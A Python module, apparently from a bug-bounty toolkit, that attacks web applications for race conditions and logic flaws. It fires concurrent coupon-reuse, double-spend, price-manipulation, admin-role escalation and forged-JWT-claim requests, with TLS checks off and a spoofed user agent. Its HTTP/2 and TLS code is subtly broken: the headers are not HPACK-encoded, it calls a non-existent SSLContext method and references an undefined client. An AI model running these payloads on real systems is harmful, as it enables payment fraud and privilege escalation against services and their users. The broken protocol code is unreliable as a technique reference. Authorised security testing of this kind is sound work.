"""
Race condition & business logic testing — 2026 techniques.

Tests: TOCTOU, coupon reuse, double-spend, workflow bypass, negative quantity,
fast-path skip, price manipulation, privilege escalation via race conditions.

2026 advanced vectors:
- HTTP/2 single-packet race (all-or-nothing concurrent attack)
- GraphQL batch mutation race
- WebSocket duplicate message race
- JWT claim manipulation race
- Turbo Intruder-style last-byte sync
- State machine mapping for workflow bypass detection
"""

from __future__ import annotations

import asyncio
import re
import time
import json
import struct
import socket
import ssl
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Any, Callable, Awaitable, Tuple
from urllib.parse import urlparse

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


# ─── HTTP/2 Single-Packet Race Helper ────────────────────────────────────────

class H2SinglePacketRace:
    """Sends multiple HTTP/2 streams in a single TCP packet to exploit race windows.

    This technique packs multiple HTTP/2 HEADERS + DATA frames into one TLS record,
    ensuring all requests are processed concurrently by the server before any
    response can be read. This is the definitive 2026 race-condition primitive.
    """

    def __init__(self, target_url: str, timeout: float = 5.0):
        self.target_url = target_url
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_tls = parsed.scheme == "https"
        self.timeout = timeout

    @staticmethod
    def _build_h2_headers(stream_id: int, method: str, path: str, host: str, extra_headers: Dict[str, str]) -> bytes:
        """Build a minimal HTTP/2 HEADERS frame (raw)."""
        # Pseudo-headers + extra headers encoded as HPACK
        # Simplified: we use a pre-built header block for the test
        pseudo = f":method={method}\r\n:path={path}\r\n:scheme=https\r\n:host={host}\r\n"
        header_lines = "\r\n".join(f"{k}={v}" for k, v in extra_headers.items())
        header_block = f"{pseudo}{header_lines}".encode()
        # HTTP/2 frame: length(3) + type(1=HEADERS) + flags(4) + stream_id(4)
        frame_type = 0x01  # HEADERS
        flags = 0x04  # END_HEADERS
        frame_header = struct.pack(">I", len(header_block) << 8 | frame_type)
        frame_header = struct.pack(">3B I", len(header_block), frame_type, flags, stream_id & 0x7FFFFFFF)
        return frame_header + header_block

    async def send_race_batch(
        self,
        requests: List[Dict[str, Any]],
        concurrency: int = 10,
    ) -> List[Dict[str, Any]]:
        """Send multiple requests as a single-packet H2 batch.

        Each request dict: {"method": "POST", "path": "/api/claim", "body": "...", "headers": {...}}
        Returns list of response dicts.
        """
        results = []

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port),
                timeout=self.timeout,
            )

            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host),
                    timeout=self.timeout,
                )

            # Send H2 connection preface
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            # SETTINGS frame (minimal)
            writer.write(struct.pack(">I", 0) + b"\x00" + b"\x00" + struct.pack(">I", 0))
            await writer.drain()

            # Build all request frames
            batch_data = b""
            for i, req in enumerate(requests[:concurrency]):
                stream_id = 2 * i + 1
                headers_frame = self._build_h2_headers(
                    stream_id,
                    req.get("method", "POST"),
                    req.get("path", "/"),
                    self.host,
                    req.get("headers", {}),
                )
                batch_data += headers_frame
                if req.get("body"):
                    body = req["body"].encode() if isinstance(req["body"], str) else req["body"]
                    data_frame = struct.pack(">3B I", len(body), 0x00, 0x00, stream_id & 0x7FFFFFFF) + body
                    batch_data += data_frame

            # Send ALL frames in a single write (single packet)
            writer.write(batch_data)
            await writer.drain()

            # Read responses (best effort)
            for _ in range(concurrency):
                try:
                    data = await asyncio.wait_for(reader.read(4096), timeout=self.timeout)
                    if data:
                        results.append({"status": 200, "raw": data[:500], "note": "response received"})
                except (asyncio.TimeoutError, Exception):
                    results.append({"status": 0, "error": "timeout"})

            writer.close()
            await writer.wait_closed()

        except Exception as e:
            logger.debug(f"H2 single-packet race failed: {e}")
            results.append({"status": 0, "error": str(e)})

        return results


# ─── GraphQL Batch Race Helper ───────────────────────────────────────────────

class GraphQLBatchRace:
    """GraphQL batch mutation race: sends N identical mutations in one HTTP batch request."""

    def __init__(self, client: httpx.AsyncClient, endpoint: str = "/graphql"):
        self.client = client
        self.endpoint = endpoint

    async def race_batch_mutations(
        self,
        mutation: str,
        variables: Dict[str, Any],
        batch_size: int = 10,
    ) -> List[Dict[str, Any]]:
        """Send batch_size identical mutations in a single GraphQL batch request."""
        batch = [
            {"operationName": "RaceTest", "query": mutation, "variables": variables}
            for _ in range(batch_size)
        ]
        try:
            resp = await self.client.post(self.endpoint, json=batch)
            return resp.json() if resp.status_code == 200 else [{"error": resp.status_code}]
        except Exception as e:
            return [{"error": str(e)}]


# ─── State Machine Mapping ───────────────────────────────────────────────────

@dataclass
class StateTransition:
    """Represents a discovered state transition in a workflow."""
    from_state: str
    to_state: str
    endpoint: str
    method: str
    payload: Dict[str, Any]
    success: bool


class WorkflowStateMapper:
    """Maps multi-step workflow state transitions to detect bypass opportunities.

    Sends requests through a workflow, tracking state changes at each step.
    Detects steps that can be skipped or reordered.
    """

    WORKFLOW_SEEDS = [
        {"path": "/api/checkout", "method": "POST", "data": {"step": "init"}},
        {"path": "/api/checkout/next", "method": "POST", "data": {}},
        {"path": "/api/order/confirm", "method": "POST", "data": {}},
        {"path": "/api/payment/process", "method": "POST", "data": {}},
        {"path": "/api/shipment/create", "method": "POST", "data": {}},
    ]

    def __init__(self, client: httpx.AsyncClient, base_url: str):
        self.client = client
        self.base_url = base_url
        self.transitions: List[StateTransition] = []

    async def map_transitions(self) -> List[StateTransition]:
        """Probe workflow endpoints and record state transitions."""
        for seed in self.WORKFLOW_SEEDS:
            url = f"{self.base_url}{seed['path']}"
            try:
                if seed["method"] == "POST":
                    resp = await self.client.post(url, json=seed["data"])
                else:
                    resp = await self.client.get(url, params=seed["data"])

                success = resp.status_code in (200, 201, 202)
                body = resp.text[:200]
                # Extract state from response
                state_match = re.search(r'"state"\s*:\s*"(\w+)"', body)
                to_state = state_match.group(1) if state_match else f"step_{resp.status_code}"

                self.transitions.append(StateTransition(
                    from_state="unknown",
                    to_state=to_state,
                    endpoint=seed["path"],
                    method=seed["method"],
                    payload=seed["data"],
                    success=success,
                ))
            except Exception:
                pass

        return self.transitions


# ─── JWT Claim Race ──────────────────────────────────────────────────────────

class JWTRaceTester:
    """Tests for JWT claim manipulation race conditions.

    Sends parallel requests with rapidly modified JWT claims (role, exp, sub)
    to exploit TOCTOU in token validation.
    """

    def __init__(self, client: httpx.AsyncClient):
        self.client = client

    async def race_jwt_claims(
        self,
        url: str,
        base_token: str,
        claim_overrides: List[Dict[str, Any]],
        concurrency: int = 5,
    ) -> List[Dict[str, Any]]:
        """Send requests with different JWT claim overrides in parallel."""
        import base64

        results = []
        async def _send(override: Dict[str, Any], idx: int) -> Dict[str, Any]:
            # Minimal JWT manipulation (for testing - assumes alg: none or known key)
            parts = base_token.split(".")
            if len(parts) == 3:
                try:
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                    payload.update(override)
                    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
                    new_token = f"{parts[0]}.{new_payload}.{parts[2]}"
                except Exception:
                    new_token = base_token
            else:
                new_token = base_token

            try:
                resp = await self.client.get(url, headers={"Authorization": f"Bearer {new_token}"})
                return {"index": idx, "status": resp.status_code, "body": resp.text[:300], "override": override}
            except Exception as e:
                return {"index": idx, "status": 0, "error": str(e)}

        tasks = [_send(ovr, i) for i, ovr in enumerate(claim_overrides[:concurrency])]
        results = await asyncio.gather(*tasks)
        return list(results)


# ─── Turbo Intruder Last-Byte Sync ───────────────────────────────────────────

class TurboIntruderRace:
    """Simulates Turbo Intruder's last-byte-sync race technique.

    Sends a partial request, then races the final bytes (e.g., closing delimiter)
    against another request to exploit parser desynchronization.
    """

    def __init__(self, host: str, port: int = 443, use_tls: bool = True):
        self.host = host
        self.port = port
        self.use_tls = use_tls

    async def last_byte_race(
        self,
        first_request: bytes,
        second_request: bytes,
        race_window_ms: float = 50,
    ) -> Dict[str, Any]:
        """Send two requests with last-byte timing control."""
        results = {"first": None, "second": None}
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port),
                timeout=5.0,
            )
            if self.use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    ctx.open_connection(reader, writer, server_hostname=self.host),
                    timeout=5.0,
                )

            # Send first request (all but last byte)
            writer.write(first_request[:-1])
            await writer.drain()

            # Small delay to desync parsers
            await asyncio.sleep(race_window_ms / 1000.0)

            # Race: send last byte of first + entire second request
            writer.write(first_request[-1:] + second_request)
            await writer.drain()

            # Read responses
            try:
                data1 = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                results["first"] = {"raw": data1[:500]}
            except Exception:
                results["first"] = {"error": "no response"}

            try:
                data2 = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                results["second"] = {"raw": data2[:500]}
            except Exception:
                results["second"] = {"error": "no response"}

            writer.close()
            await writer.wait_closed()
        except Exception as e:
            results["error"] = str(e)

        return results


@dataclass
class RaceConditionFinding:
    """Single race condition / business logic finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class RaceConditionResult:
    """Complete race condition assessment result."""
    target: str
    findings: List[RaceConditionFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    race_conditions_found: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


class RaceConditionTester:
    """
    Race condition and business logic tester.

    2026 attack vectors:
    - TOCTOU (Time-of-Check Time-of-Use) on balance/stock checks
    - Coupon/discount reuse via parallel requests
    - Double-spend on payments
    - Workflow bypass (skip steps)
    - Negative quantity / price manipulation
    - Fast-path skip (bypass slow checks)
    - Privilege escalation via race conditions
    - Gift card / voucher balance manipulation
    """

    # Common endpoints to test
    BUSINESS_ENDPOINTS = [
        "/api/checkout",
        "/api/payment",
        "/api/purchase",
        "/api/order",
        "/api/cart",
        "/api/apply-coupon",
        "/api/redeem",
        "/api/transfer",
        "/api/withdraw",
        "/api/deposit",
        "/api/refund",
        "/api/voucher",
        "/api/gift-card",
        "/api/points",
        "/api/balance",
        "/api/stock",
        "/api/inventory",
        "/api/reserve",
        "/api/booking",
        "/api/ticket",
        "/api/license",
    ]

    # Race condition payloads
    RACE_PAYLOADS = [
        {
            "name": "Coupon Reuse",
            "category": "coupon_reuse",
            "description": "Apply same coupon multiple times in parallel",
            "method": "POST",
            "data": {"coupon_code": "TEST100", "discount": 50},
            "severity": "high",
        },
        {
            "name": "Double Spend",
            "category": "double_spend",
            "description": "Spend same balance/gift card in parallel",
            "method": "POST",
            "data": {"amount": 100, "currency": "USD"},
            "severity": "critical",
        },
        {
            "name": "Negative Quantity",
            "category": "negative_quantity",
            "description": "Submit negative quantity to gain credits",
            "method": "POST",
            "data": {"product_id": "test", "quantity": -1},
            "severity": "high",
        },
        {
            "name": "Price Manipulation",
            "category": "price_manipulation",
            "description": "Modify price in request",
            "method": "POST",
            "data": {"product_id": "test", "price": 0.01, "quantity": 1},
            "severity": "critical",
        },
        {
            "name": "Privilege Escalation Race",
            "category": "privilege_escalation",
            "description": "Race to escalate privileges",
            "method": "POST",
            "data": {"role": "admin", "user_id": "self"},
            "severity": "critical",
        },
        {
            "name": "Stock Depletion",
            "category": "stock_depletion",
            "description": "Race to buy last item",
            "method": "POST",
            "data": {"product_id": "limited", "quantity": 1},
            "severity": "medium",
        },
    ]

    # Business logic bypass payloads
    BYPASS_PAYLOADS = [
        {
            "name": "Workflow Skip (Step Bypass)",
            "category": "workflow_bypass",
            "description": "Skip verification step in multi-step process",
            "severity": "high",
        },
        {
            "name": "Fast-Path Skip",
            "category": "fast_path_skip",
            "description": "Bypass slow security checks via direct API",
            "severity": "high",
        },
        {
            "name": "State Manipulation",
            "category": "state_manipulation",
            "description": "Manipulate order/transaction state",
            "severity": "high",
        },
        {
            "name": "Business Rule Bypass",
            "category": "business_rule_bypass",
            "description": "Bypass business rules via API manipulation",
            "severity": "medium",
        },
    ]

    def __init__(
        self,
        target: str,
        timeout: float = 10.0,
        max_concurrent: int = 10,
        proxy: Optional[str] = None,
        auth_header: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        verbose: bool = False,
    ):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.proxy = proxy
        self.auth_header = auth_header
        self.cookies = cookies or {}
        self.verbose = verbose

        self._client = httpx.AsyncClient(
            timeout=timeout,
            follow_redirects=True,
            proxy=proxy,
            verify=False,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                **({"Authorization": auth_header} if auth_header else {}),
            },
            cookies=self.cookies,
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def test_all(self) -> RaceConditionResult:
        """Run all race condition and business logic tests."""
        result = RaceConditionResult(target=self.target)

        logger.info(f"[*] Starting race condition & business logic testing: {self.target}")

        # Phase 1: Discover business endpoints
        endpoints = await self._discover_business_endpoints()
        logger.info(f"[*] Found {len(endpoints)} business endpoints")

        # Phase 2: Race condition tests
        for ep in endpoints:
            for payload_def in self.RACE_PAYLOADS:
                finding = await self._test_race_condition(ep, payload_def)
                if finding:
                    result.findings.append(finding)
                    result.race_conditions_found += 1
            result.endpoints_tested += 1

        # Phase 3: Business logic bypass
        for ep in endpoints:
            for bypass_def in self.BYPASS_PAYLOADS:
                finding = await self._test_business_bypass(ep, bypass_def)
                if finding:
                    result.findings.append(finding)

        # Phase 4: Negative quantity / price manipulation
        for ep in endpoints:
            finding = await self._test_price_manipulation(ep)
            if finding:
                result.findings.append(finding)

        # Phase 5: TOCTOU tests
        for ep in endpoints:
            finding = await self._test_toctou(ep)
            if finding:
                result.findings.append(finding)

        logger.info(
            f"[+] Race condition testing complete: {len(result.findings)} findings "
            f"across {result.endpoints_tested} endpoints"
        )
        return result

    def _save_results(self, result: "RaceConditionResult", output_dir: str) -> str:
        """Persist race condition results to <output_dir>/race_<host>.json."""
        from urllib.parse import urlparse
        host = urlparse(self.target).hostname or self.target.replace("://", "_")
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        filepath = out / f"race_{host}.json"
        payload = {
            "target": result.target,
            "timestamp": result.timestamp,
            "endpoints_tested": result.endpoints_tested,
            "summary": result.summary,
            "findings": [asdict(f) for f in result.findings],
        }
        filepath.write_text(json.dumps(payload, indent=2, default=str))
        logger.info(f"[+] Results saved → {filepath}")
        return str(filepath)

    async def _discover_business_endpoints(self) -> List[str]:
        """Discover active business logic endpoints."""
        active = []

        for ep in self.BUSINESS_ENDPOINTS:
            url = f"{self.target}{ep}"
            try:
                resp = await self._client.get(url)
                # 404 = not found, 405 = method not allowed (endpoint exists!)
                if resp.status_code in (200, 400, 401, 403, 405, 422):
                    active.append(ep)
                    if self.verbose:
                        logger.info(f"  [+] Endpoint active: {ep} ({resp.status_code})")
            except Exception:
                pass

        return active

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_race_condition(
        self, endpoint: str, payload_def: Dict[str, Any]
    ) -> Optional[RaceConditionFinding]:
        """Test for race condition by sending concurrent requests."""
        url = f"{self.target}{endpoint}"

        async def send_request(idx: int) -> Dict[str, Any]:
            try:
                if payload_def["method"] == "POST":
                    resp = await self._client.post(url, json=payload_def["data"])
                else:
                    resp = await self._client.get(url, params=payload_def["data"])

                return {
                    "index": idx,
                    "status": resp.status_code,
                    "body": resp.text[:500],
                    "headers": dict(resp.headers),
                }
            except Exception as e:
                return {"index": idx, "status": 0, "error": str(e)}

        # Send concurrent requests
        tasks = [send_request(i) for i in range(self.max_concurrent)]
        responses = await asyncio.gather(*tasks)

        # Analyze responses for race condition indicators
        success_count = sum(1 for r in responses if r.get("status") == 200)
        error_count = sum(1 for r in responses if r.get("status") in (400, 409, 422))

        # Race condition detected if multiple requests succeeded
        if success_count > 1 and payload_def["category"] in [
            "coupon_reuse", "double_spend", "stock_depletion"
        ]:
            return RaceConditionFinding(
                category=payload_def["category"],
                severity=payload_def["severity"],
                title=f"Race Condition: {payload_def['name']}",
                description=f"Endpoint {endpoint} is vulnerable to race condition. "
                f"{success_count}/{self.max_concurrent} concurrent requests succeeded.",
                endpoint=endpoint,
                payload=json.dumps(payload_def["data"])[:500],
                evidence=f"Responses: {[r.get('status') for r in responses[:5]]}",
                remediation="Implement proper locking/queuing for critical operations. "
                "Use database transactions with SELECT FOR UPDATE.",
            )

        # Check for inconsistent responses (data race)
        status_codes = [r.get("status") for r in responses]
        if len(set(status_codes)) > 1 and 200 in status_codes:
            # Check if response bodies differ
            success_bodies = [r.get("body", "") for r in responses if r.get("status") == 200]
            if len(set(success_bodies)) > 1:
                return RaceConditionFinding(
                    category=payload_def["category"],
                    severity="medium",
                    title=f"Inconsistent Race Response: {payload_def['name']}",
                    description=f"Endpoint {endpoint} returns different responses under concurrent load.",
                    endpoint=endpoint,
                    payload=json.dumps(payload_def["data"])[:500],
                    evidence=f"Status codes: {status_codes[:5]}",
                    remediation="Implement consistent state management for concurrent operations.",
                )

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_business_bypass(
        self, endpoint: str, bypass_def: Dict[str, Any]
    ) -> Optional[RaceConditionFinding]:
        """Test for business logic bypass."""
        url = f"{self.target}{endpoint}"

        # Test various bypass techniques
        bypass_techniques = [
            # Skip required field
            {},
            # Add extra fields
            {"_bypass": "true", "_admin": "true", "_skip_validation": "true"},
            # Manipulate state
            {"state": "completed", "status": "approved", "verified": True},
            # Add admin flags
            {"role": "admin", "is_admin": True, "admin": True, "sudo": True},
        ]

        for technique in bypass_techniques:
            try:
                resp = await self._client.post(url, json=technique)

                if resp.status_code == 200:
                    body = resp.text.lower()
                    # Check if bypass was successful
                    indicators = [
                        "success",
                        "approved",
                        "completed",
                        "admin",
                        "bypassed",
                    ]
                    for indicator in indicators:
                        if indicator in body:
                            return RaceConditionFinding(
                                category=bypass_def["category"],
                                severity=bypass_def["severity"],
                                title=f"Business Bypass: {bypass_def['name']}",
                                description=f"Endpoint {endpoint} may be vulnerable to {bypass_def['description']}.",
                                endpoint=endpoint,
                                payload=json.dumps(technique)[:500],
                                evidence=f"Response: {resp.text[:500]}",
                                remediation="Implement proper server-side validation. "
                                "Never trust client-side state or flags.",
                            )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_price_manipulation(
        self, endpoint: str
    ) -> Optional[RaceConditionFinding]:
        """Test for price/amount manipulation."""
        url = f"{self.target}{endpoint}"

        manipulation_payloads = [
            {"price": 0},
            {"price": -100},
            {"price": 0.0001},
            {"amount": 0},
            {"amount": -1000},
            {"total": 0},
            {"total": -1},
            {"discount": 100},
            {"discount": 99999},
            {"coupon_percent": 100},
            {"free": True},
            {"skip_payment": True},
        ]

        for payload in manipulation_payloads:
            try:
                resp = await self._client.post(url, json=payload)

                if resp.status_code == 200:
                    body = resp.text.lower()
                    if any(word in body for word in ["success", "confirmed", "completed", "order placed"]):
                        return RaceConditionFinding(
                            category="price_manipulation",
                            severity="critical",
                            title="Price Manipulation Vulnerability",
                            description=f"Endpoint {endpoint} accepted manipulated price/amount value.",
                            endpoint=endpoint,
                            payload=json.dumps(payload)[:500],
                            evidence=f"Response: {resp.text[:500]}",
                            remediation="Validate prices server-side. Never trust client-provided prices. "
                            "Use database-stored prices for all calculations.",
                        )

            except Exception:
                pass

        return None

    @tenacity.retry(stop=tenacity.stop_after_attempt(2), wait=tenacity.wait_fixed(1))
    async def _test_toctou(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """Test for TOCTOU (Time-of-Check Time-of-Use) vulnerabilities."""
        url = f"{self.target}{endpoint}"

        # TOCTOU: Check stock, then modify stock before purchase
        # This is a conceptual test - in practice, you'd need to intercept/modify requests

        # Step 1: Check if endpoint has separate check/purchase steps
        try:
            # Try to find check endpoint
            check_endpoints = [
                f"{endpoint}/check",
                f"{endpoint}/validate",
                f"{endpoint}/verify",
                f"{endpoint}/availability",
            ]

            for check_ep in check_endpoints:
                check_url = f"{self.target}{check_ep}"
                resp = await self._client.get(check_url)

                if resp.status_code in (200, 400):
                    # Found a check endpoint - potential TOCTOU
                    return RaceConditionFinding(
                        category="toctou",
                        severity="high",
                        title="Potential TOCTOU Vulnerability",
                        description=f"Endpoint {endpoint} has separate check/validate step ({check_ep}). "
                        f"This may be vulnerable to Time-of-Check Time-of-Use attacks.",
                        endpoint=endpoint,
                        evidence=f"Check endpoint: {check_ep} returned {resp.status_code}",
                        remediation="Combine check and action in single atomic operation. "
                        "Use database locking (SELECT FOR UPDATE).",
                    )

        except Exception:
            pass

        return None

    # ─── 2026 Advanced Race Techniques ──────────────────────────────────────

    async def test_h2_single_packet_race(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """HTTP/2 single-packet race: all requests in one TCP write."""
        try:
            h2race = H2SinglePacketRace(self.target, timeout=self.timeout)
            requests = [
                {"method": "POST", "path": endpoint, "body": json.dumps({"action": "claim", "i": i})}
                for i in range(10)
            ]
            results = await h2race.send_race_batch(requests, concurrency=10)

            success_count = sum(1 for r in results if r.get("status") == 200)
            if success_count > 1:
                return RaceConditionFinding(
                    category="h2_single_packet_race",
                    severity="critical",
                    title="HTTP/2 Single-Packet Race Condition",
                    description=f"Endpoint {endpoint} vulnerable to H2 single-packet race. "
                    f"{success_count}/10 concurrent requests succeeded.",
                    endpoint=endpoint,
                    payload=f"H2 batch of {len(requests)} requests",
                    evidence=f"Results: {[r.get('status') for r in results[:5]]}",
                    remediation="Use atomic server-side locking for all state-changing operations. "
                    "Consider using database-level serialized transactions.",
                )
        except Exception as e:
            logger.debug(f"H2 race test failed: {e}")

        return None

    async def test_graphql_batch_race(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """GraphQL batch mutation race: N mutations in one batch request."""
        mutation = """
        mutation ClaimReward($input: ClaimInput!) {
            claimReward(input: $input) { success message }
        }
        """
        try:
            batch_race = GraphQLBatchRace(self.client, endpoint)
            results = await batch_race.race_batch_mutations(
                mutation,
                {"rewardId": "test", "amount": 100},
                batch_size=10,
            )

            # Check if multiple claims succeeded
            successes = sum(
                1 for r in results
                if isinstance(r, dict) and r.get("data", {}).get("claimReward", {}).get("success")
            )
            if successes > 1:
                return RaceConditionFinding(
                    category="graphql_batch_race",
                    severity="critical",
                    title="GraphQL Batch Mutation Race",
                    description=f"GraphQL endpoint {endpoint} allows batch mutation race. "
                    f"{successes}/10 mutations succeeded.",
                    endpoint=endpoint,
                    payload=f"GraphQL batch of 10 mutations",
                    evidence=f"Successes: {successes}",
                    remediation="Implement per-request locking on mutation resolvers. "
                    "Disable batch operations or enforce single-mutation rate limits.",
                )
        except Exception as e:
            logger.debug(f"GraphQL batch race test failed: {e}")

        return None

    async def test_websocket_race(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """WebSocket duplicate message race: send identical messages simultaneously."""
        ws_url = self.target.replace("http", "ws") + endpoint
        try:
            import websockets
            async with websockets.connect(ws_url, ssl=False) as ws:
                # Send identical "claim" messages concurrently
                messages = [json.dumps({"action": "claim", "id": "test123"}) for _ in range(10)]
                await asyncio.gather(*[ws.send(msg) for msg in messages])

                # Read responses
                responses = []
                try:
                    for _ in range(10):
                        resp = await asyncio.wait_for(ws.recv(), timeout=2.0)
                        responses.append(resp)
                except asyncio.TimeoutError:
                    pass

                successes = sum(1 for r in responses if "success" in r.lower() or "claimed" in r.lower())
                if successes > 1:
                    return RaceConditionFinding(
                        category="websocket_race",
                        severity="critical",
                        title="WebSocket Duplicate Message Race",
                        description=f"WebSocket endpoint {endpoint} vulnerable to duplicate message race. "
                        f"{successes}/10 messages succeeded.",
                        endpoint=endpoint,
                        payload=f"10 duplicate WebSocket messages",
                        evidence=f"Responses: {responses[:3]}",
                        remediation="Implement server-side deduplication and idempotency keys. "
                        "Use sequence numbers to prevent replay.",
                    )
        except ImportError:
            logger.debug("websockets package not installed — skipping WS race test")
        except Exception as e:
            logger.debug(f"WebSocket race test failed: {e}")

        return None

    async def test_jwt_race(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """JWT claim manipulation race: parallel requests with modified claims."""
        # Get a baseline token
        try:
            resp = await self._client.post(f"{self.target}/api/auth/login", json={"user": "test", "pass": "test"})
            if resp.status_code != 200:
                return None
            token = resp.json().get("token", "")
            if not token:
                return None
        except Exception:
            return None

        jwt_tester = JWTRaceTester(self.client)
        overrides = [
            {"role": "admin"},
            {"role": "admin", "is_admin": True},
            {"sub": "administrator"},
            {"role": "superadmin", "permissions": ["*"]},
            {"exp": 9999999999},
        ]

        results = await jwt_tester.race_jwt_claims(
            f"{self.target}{endpoint}",
            token,
            overrides,
            concurrency=5,
        )

        admin_successes = sum(
            1 for r in results
            if r.get("status") == 200 and r.get("override", {}).get("role") in ("admin", "superadmin")
        )
        if admin_successes > 0:
            return RaceConditionFinding(
                category="jwt_race",
                severity="critical",
                title="JWT Claim Manipulation Race",
                description=f"Endpoint {endpoint} accepts modified JWT claims under race. "
                f"{admin_successes}/5 admin-privilege requests succeeded.",
                endpoint=endpoint,
                payload=f"JWT claim overrides: {[r.get('override') for r in results if r.get('status') == 200]}",
                evidence=f"Results: {[(r.get('override'), r.get('status')) for r in results]}",
                remediation="Validate JWT claims against server-side session store. "
                "Never trust client-modifiable claims for authorization.",
            )

        return None

    async def test_turbo_intruder_race(self, endpoint: str) -> Optional[RaceConditionFinding]:
        """Turbo Intruder last-byte-sync race: desync parser with timing control."""
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 443)

        turbo = TurboIntruderRace(host, port, use_tls=(parsed.scheme == "https"))

        # Craft two conflicting requests
        first = f"POST {endpoint} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\n\r\n" + '{"action":"read"}'
        second = f"POST {endpoint} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 14\r\n\r\n" + '{"action":"write"}'

        results = await turbo.last_byte_race(first.encode(), second.encode(), race_window_ms=5)

        if "error" not in results:
            return RaceConditionFinding(
                category="turbo_intruder_race",
                severity="high",
                title="Last-Byte-Sync Parser Desync",
                description=f"Endpoint {endpoint} may be vulnerable to last-byte-sync race "
                f"(Turbo Intruder technique).",
                endpoint=endpoint,
                payload="Last-byte-sync with POST body desync",
                evidence=f"First: {results.get('first', {}).get('raw', b'')[:200]}, "
                f"Second: {results.get('second', {}).get('raw', b'')[:200]}",
                remediation="Ensure HTTP parser processes complete requests atomically. "
                "Reject partial or malformed requests.",
            )

        return None
